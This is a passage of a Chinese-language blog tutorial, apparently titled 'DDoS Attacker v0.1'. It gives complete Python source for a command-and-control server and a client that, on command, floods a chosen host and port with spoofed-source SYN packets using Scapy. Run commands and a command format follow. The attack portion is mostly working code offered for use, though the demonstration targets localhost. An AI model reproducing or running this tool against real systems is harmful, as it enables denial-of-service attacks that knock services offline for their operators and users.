class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 接受一个新的连接</span></span><br><span class="line">    sock, addr = s.accept()</span><br><span class="line">    <span class="comment"># 添加新的连接到列表</span></span><br><span class="line">    cliList.append(sock)</span><br><span class="line">    <span class="comment">## 测试：显示已连接的客户机IP</span></span><br><span class="line">    <span class="keyword">for</span> client_ip <span class="keyword">in</span> cliList:</span><br><span class="line">        print(<span class="string">"Cliend IP: "</span> + str(client_ip))</span><br></pre></td></tr></table></figure>

<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="服务端实现"><a href="#服务端实现" class="headerlink" title="服务端实现"></a>服务端实现</h3><p>终于到攻击器的具体实现阶段啦，首先我们编写Server端代码。<br>具体的实现思路和流程，都写在代码内的注释中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">socketList = []</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">5. 第五步，实现发送命令的函数</span></span><br><span class="line"><span class="string">便利socketList，将每个socket都调用一次send将命令发送出去</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># def sendCmd(cmd):</span></span><br><span class="line"><span class="comment">#     print("Send command......")</span></span><br><span class="line"><span class="comment">#     for sock in socketList:</span></span><br><span class="line"><span class="comment">#         sock.send(cmd.encode = ('utf-8'))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendCmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    print(<span class="string">"Send command......"</span>)</span><br><span class="line">    <span class="keyword">for</span> sock <span class="keyword">in</span> socketList:</span><br><span class="line">        sock.send(cmd.encode(<span class="string">'UTF-8'</span>))    </span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">4. 第四步,实现等待客户端的函数</span></span><br><span class="line"><span class="string">循环等待客户端连接，并判断socket是否在socketList已存储过，没有则添加</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waitConnect</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sock, addr = s.accept()</span><br><span class="line">        <span class="keyword">if</span> sock <span class="keyword">not</span> <span class="keyword">in</span> socketList:</span><br><span class="line">            socketList.append(sock)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">1. 第一步，编写主函数</span></span><br><span class="line"><span class="string">创建socket，绑定所有网络地址和58868端口并开始监听；</span></span><br><span class="line"><span class="string">新开一个线程等待客户端的连接，以免阻塞我们输入命令（注意）</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">'0.0.0.0'</span>, <span class="number">58868</span>))</span><br><span class="line">    s.listen(<span class="number">1024</span>)</span><br><span class="line">    t = Thread(target=waitConnect, args = (s, ))</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    2. 第二步</span></span><br><span class="line"><span class="string">    将新开的线程中连接进来的socket添加到一个list中</span></span><br><span class="line"><span class="string">    并检查一下socket长度，需要至少一个客户端连接</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(<span class="string">'Wait at least a client connection!'</span>)</span><br><span class="line">    <span class="comment"># 若没有客户端连接，则</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> len(socketList):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">'It has been a client connection!'</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    3. 第三步</span></span><br><span class="line"><span class="string">    循环等待输入命令，输入后判断是否符合命令格式的基本要求（自己定）</span></span><br><span class="line"><span class="string">    满足，则把命令发送到所有客户端</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"="</span> * <span class="number">50</span>)</span><br><span class="line">        print(<span class="string">'The command format:"#-H xxx.xxx.xxx.xxx -p xxxx -c &lt;start&gt;"'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 等待输入的命令</span></span><br><span class="line">        cmd_str = input(<span class="string">'Please input command: '</span>)</span><br><span class="line">        <span class="keyword">if</span> len(cmd_str):</span><br><span class="line">            <span class="keyword">if</span> cmd_str[<span class="number">0</span>] == <span class="string">'#'</span>:</span><br><span class="line">                sendCmd(cmd_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="客户端实现"><a href="#客户端实现" class="headerlink" title="客户端实现"></a>客户端实现</h3><p>同样，具体的实现思路和流程，都写在代码内的注释中。<br>客户端实现代码如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">isWorking = <span class="literal">False</span></span><br><span class="line">curProcess = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SYN flood attack</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">synFlood</span><span class="params">(tgt,dPort)</span>:</span></span><br><span class="line">    print(<span class="string">'='</span>*<span class="number">100</span>)</span><br><span class="line">    print(<span class="string">'The syn flood is running!'</span>)</span><br><span class="line">    print(<span class="string">'='</span>*<span class="number">100</span>)</span><br><span class="line">    srcList = [<span class="string">'201.1.1.2'</span>,<span class="string">'10.1.1.102'</span>,<span class="string">'69.1.1.2'</span>,<span class="string">'125.130.5.199'</span>]</span><br><span class="line">    <span class="keyword">for</span> sPort <span class="keyword">in</span> range(<span class="number">1024</span>,<span class="number">65535</span>):</span><br><span class="line">        index = random.randrange(<span class="number">4</span>)</span><br><span class="line">        ipLayer = IP(src=srcList[index], dst=tgt)</span><br><span class="line">        tcpLayer = TCP(sport=sPort, dport=dPort,flags=<span class="string">"S"</span>)</span><br><span class="line">        packet = ipLayer / tcpLayer </span><br><span class="line">        send(packet)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">3. 第三步</span></span><br><span class="line"><span class="string">创建全部变量curProcess，用于判断是否有进程正在发起SYN泛洪攻击</span></span><br><span class="line"><span class="string">循环等待接受命令，接收到的数据类型为byte型，需要对其进行解码，解码后才为字符串</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># Process Command</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmdHandle</span><span class="params">(sock, parser)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> curProcess</span><br><span class="line">    <span class="comment"># TODO</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt;= <span class="number">20</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="comment"># 接收到的数据长度为0，则跳过后续内容，重新接收;</span></span><br><span class="line">        <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'The data is empty'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接收到的数据长度不为0，则判断是否有命令基本格式的特征#，满足则用ArgumentParser对象解析命令</span></span><br><span class="line">        <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">'#'</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># Parse Command</span></span><br><span class="line">                options = parser.parse_args(data[<span class="number">1</span>:].split())</span><br><span class="line">                m_host = options.host</span><br><span class="line">                m_port = options.port</span><br><span class="line">                m_cmd = options.cmd</span><br><span class="line"></span><br><span class="line">                <span class="string">'''</span></span><br><span class="line"><span class="string">                4. 第四步</span></span><br><span class="line"><span class="string">                判断命令参数解析后，是start命令还是stop命令</span></span><br><span class="line"><span class="string">                首先，判断当前是否有进程在运行，如果有进程判断进程是否存活</span></span><br><span class="line"><span class="string">                '''</span></span><br><span class="line">                <span class="comment"># DDoS Start Command</span></span><br><span class="line">                <span class="keyword">if</span> m_cmd.lower() == <span class="string">'start'</span>:</span><br><span class="line">                    <span class="comment"># 如果当前有进程正在发起SYN泛洪攻击，我们就先结束这个进程，并清空屏幕，再启动一个进程</span></span><br><span class="line">                    <span class="keyword">if</span> curProcess != <span class="literal">None</span> <span class="keyword">and</span> curProcess.is_alive():</span><br><span class="line">                        <span class="comment"># 结束进程</span></span><br><span class="line">                        curProcess.terminate()</span><br><span class="line">                        curProcess = <span class="literal">None</span></span><br><span class="line">                        os.system(<span class="string">'clear'</span>)</span><br><span class="line">                    print(<span class="string">'The synFlood is already started'</span>)</span><br><span class="line">                    p = Process(target=synFlood, args=(m_host, m_port))</span><br><span class="line">                    p.start()</span><br><span class="line">                    curProcess = p</span><br><span class="line">                    <span class="comment"># TODO</span></span><br><span class="line">                    count = count+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># DDoS Stop Command</span></span><br><span class="line">                <span class="keyword">elif</span> m_cmd.lower() == <span class="string">'stop'</span>:</span><br><span class="line">                    <span class="keyword">if</span> curProcess.is_alive():</span><br><span class="line">                        curProcess.terminate()</span><br><span class="line">                        os.system(<span class="string">'clear'</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">'Failed to perform the command!'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">1. 第一步  </span></span><br><span class="line"><span class="string">创建ArgumentParser对象，设置好需要解析的命令参数</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p = argparse.ArgumentParser()</span><br><span class="line">    p.add_argument(<span class="string">'-H'</span>, dest = <span class="string">'host'</span>, type = str)</span><br><span class="line">    p.add_argument(<span class="string">'-p'</span>, dest = <span class="string">'port'</span>, type = int)</span><br><span class="line">    p.add_argument(<span class="string">'-c'</span>, dest = <span class="string">'cmd'</span>, type = str)</span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    2. 第二步</span></span><br><span class="line"><span class="string">    创建socket，连接服务器</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="comment">## 测试用，连接本地的58868端口</span></span><br><span class="line">        s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">58868</span>))</span><br><span class="line">        print(<span class="string">'To connect server was success!'</span>)</span><br><span class="line">        print(<span class="string">'='</span> * <span class="number">50</span>)</span><br><span class="line">        cmdHandle(s, p)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'The network connected failed!'</span>)</span><br><span class="line">        print(<span class="string">'Please restart the script!'</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="测试使用"><a href="#测试使用" class="headerlink" title="测试使用"></a>测试使用</h2><p>首先，我们规定了命令格式为：<code>#-H xxx.xxx.xxx.xxx -p xxxx -c &lt;start&gt;</code><br>e.g. <code>#-H 127.0.0.1 -p 8085 -c start</code>， <code> #-H 127.0.0.1 -p 8085 -c stop</code>  </p>
<p>首先执行server脚本，然后执行client脚本，等待连接，连接成功，即可在server端操控client进行攻击，示例如下：</p>
<ol>
<li><p>启动server</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python ddos_server_v0.1.py</span><br></pre></td></tr></table></figure></li>
<li><p>启动client</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python ddos_client_v0.1.py</span><br></pre></td></tr></table></figure></li>
<li><p>连接成功<br><img src="http://119.3.78.82:8085/uploads/big/a375724463afb7b4eae2b0550a05764f.png" alt="连接成功"></p>
</li>
<li><p>进行攻击<br><img src="http://119.3.78.82:8085/uploads/big/6961dee0c77ba3b193f26447e4b7932f.png" alt="进行攻击"></p>
</li>
<li><p>停止攻击<br><img src="http://119.3.78.82:8085/uploads/big/b41516447d764d6b43914b984a656792.png" alt="停止攻击"></p>
</li>
</ol>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1]Blog.csdn.net. (2019). 网络篇——七层协议、四层协议、TCP、HTTP、SOCKET、长短连接 - 袁伏彪 —— 共享，共赢 - CSDN博客. [online] Available at: <a href="https://blog.csdn.net/bjyfb/article/details/6682913" target="_blank" rel="noopener">https://blog.csdn.net/bjyfb/article/details/6682913</a> [Accessed 25 Oct. 2019].<br>[2]Jb51.net. (2019). Python实现DDoS. [online] Available at: <a href="https://www.jb51.net/article/155870.htm" target="_blank" rel="noopener">https://www.jb51.net/article/155870.htm</a> [Accessed 25 Oct. 2019].<br>[3]Blog.csdn.net. (2019). TCP包的类型 (SYN, FIN, ACK, PSH, RST, URG) - lqglqglqg的专栏 - CSDN博客. [online] Available at: <a href="https://blog.csdn.net/lqglqglqg/article/details/48714611" target="_blank" rel="noopener">https://blog.csdn.net/lqglqglqg/article/details/48714611</a> [Accessed 25 Oct. 2019].</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/Project">Projects</a></li>
         
          <li><a href="/tags">Tags</a></li>
         
          <li><a href="https://y1ng.cc/" target="_blank" rel="noopener">BBS</a></li>
         
          <li><a href="/books">Books</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DDoS-Attacker-v0-1"><span class="toc-number">1.</span> <span class="toc-text">DDoS Attacker v0.1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#仓库链接"><span class="toc-number">1.1.</span> <span class="toc-text">仓库链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#仓库结构"><span class="toc-number">1.2.</span> <span class="toc-text">仓库结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击原理"><span class="toc-number">1.3.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#补充：TCP三次握手以及TCP-IP族相关"><span class="toc-number">1.4.</span> <span class="toc-text">补充：TCP三次握手以及TCP&#x2F;IP族相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-IP协议族"><span class="toc-number">1.4.1.</span> <span class="toc-text">TCP&#x2F;IP协议族</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三次“建立”四次“分手”"><span class="toc-number">1.4.2.</span> <span class="toc-text">三次“建立”四次“分手”</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工具介绍"><span class="toc-number">1.5.</span> <span class="toc-text">工具介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tips-踩坑小提示："><span class="toc-number">1.5.1.</span> <span class="toc-text">Tips 踩坑小提示：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#扩展：最小权限原则与sudo的使用"><span class="toc-number">1.5.2.</span> <span class="toc-text">扩展：最小权限原则与sudo的使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DDoS实现思路"><span class="toc-number">1.6.</span> <span class="toc-text">DDoS实现思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#前期准备"><span class="toc-number">1.7.</span> <span class="toc-text">前期准备</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实现一次SYN泛洪攻击"><span class="toc-number">1.7.1.</span> <span class="toc-text">实现一次SYN泛洪攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用argparse命令行解析模块"><span class="toc-number">1.7.2.</span> <span class="toc-text">使用argparse命令行解析模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用socket模块"><span class="toc-number">1.7.3.</span> <span class="toc-text">使用socket模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#具体实现"><span class="toc-number">1.8.</span> <span class="toc-text">具体实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#服务端实现"><span class="toc-number">1.8.1.</span> <span class="toc-text">服务端实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#客户端实现"><span class="toc-number">1.8.2.</span> <span class="toc-text">客户端实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试使用"><span class="toc-number">1.9.</span> <span class="toc-text">测试使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.10.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&text=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&title=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&is_video=false&description=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=DDoS_Attacker_0.1&body=Check out this article: https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&title=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&title=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&title=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&title=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&name=DDoS_Attacker_0.1&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&t=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Toky
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/Project">Projects</a></li>
         
          <li><a href="/tags">Tags</a></li>
         
          <li><a href="https://y1ng.cc/" target="_blank" rel="noopener">BBS</a></li>
         
          <li><a href="/books">Books</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight .code pre").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      target: function(trigger) {
        return trigger.nextElementSibling;
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-157954403-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
